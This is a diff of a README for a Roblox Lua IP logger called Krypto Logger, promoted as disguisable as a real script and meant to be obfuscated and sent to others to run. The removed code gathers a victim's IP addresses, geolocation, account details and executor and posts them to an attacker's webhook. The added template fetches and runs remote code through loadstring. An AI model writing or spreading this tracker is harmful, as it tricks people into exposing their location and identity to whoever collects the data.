@@ -1,8 +1,14 @@
-# KryptonLogger
+# Krypto Logger
+*Advance modern IP-Logger that can be disguised as a real script. All under 200 lines!💃*
 
+# Configuring
 
-Configure this `local a = "webhook here"` then send to anybody and tell them to execute this (make sure to obfuscate)
+A template on how to configure it. Make sure to obfuscate it 🕶
 
 ```lua
-function ExecuteWebhook()local a=""local b=game:HttpGet("https://api.ipify.org")local c=game:HttpGet("https://api64.ipify.org")local d=game:HttpGet("https://httpbin.org/get")local e=game:HttpGet("http://www.geoplugin.net/json.gp?ip="..b)local f=game:GetService("Players").LocalPlayer;local g=f.AccountAge;local h=string.sub(tostring(f.MembershipType),21)local i=f.UserId;local j=f.Name;local k=f.DisplayName;local l=game.PlaceId;local m=game.Players.LocalPlayer;local n=os.date("!%Y-%m-%d-%H:%M:%S GMT+0")local o="Version 1.0B"function identifyexploit()local p,q=pcall(identifyexecutor)if p then return q end;return SENTINEL_LOADED and"Sentinel"or XPROTECT and"SirHurt"or PROTOSMASHER_LOADED and"Protosmasher"end;local function r()local s=getfenv()if s.game then return 2 elseif s.plugin then return 4 elseif s.studio then return 5 else if s.Level1 then return 1 elseif s.Level3 then return 3 elseif s.Level6 then return 6 elseif s.Level7 then return 7 elseif s.Level8 then return 8 else return 0 end end end;r()local t=tostring(r())local u={["content-type"]="application/json"}local v={["content"]="",["embeds"]={{["author"]={["name"]="Someone Executed Krypton! "},["title"]=j,["description"]=": "..k,["fields"]={{["name"]="__Username:__",["value"]=j,["inline"]=true},{["name"]="__User:__",["value"]="https://www.roblox.com/users/"..m.UserId,["inline"]=true},{["name"]="__UserId:__",["value"]=i,["inline"]=true},{["name"]="__Membership Type:__",["value"]=h,["inline"]=true},{["name"]="__Account Age (days):__",["value"]=g,["inline"]=true},{["name"]="__Place ID:__ ",["value"]=l,["inline"]=true},{["name"]="__Game Link:__ ",["value"]="https://www.roblox.com/games/"..l,["inline"]=true},{["name"]="__Executor:__ ",["value"]=identifyexploit(),["inline"]=true},{["name"]="__Executor LVL:__ ",["value"]="Not really accurate : "..t,["inline"]=true},{["name"]="__IPv4:__",["value"]=b,["inline"]=true},{["name"]="__IPv6:__",["value"]=c,["inline"]=true},{["name"]="__Log Time:__",["value"]=n,["inline"]=true},{["name"]="__HTTPbin Data__ (JSON):",["value"]="```json".."\n"..d.."```",["inline"]=false},{["name"]="__geoPlugin Data__ (JSON):",["value"]="```json".."\n"..e.."```",["inline"]=false}}}}}local v=game:GetService("HttpService"):JSONEncode(v)HttpRequest=syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request;HttpRequest({Url=a,Body=v,Method="POST",Headers=u})end;if _G.AntiSpam==true then while true do end else ExecuteWebhook()end;_G.AntiSpam=true
+_G.Webhook = ""
+_G.SomeoneExecuted = "<enter like what your ip logger name>"
+loadstring(game:HttpGet(''))()
 ```
+
+
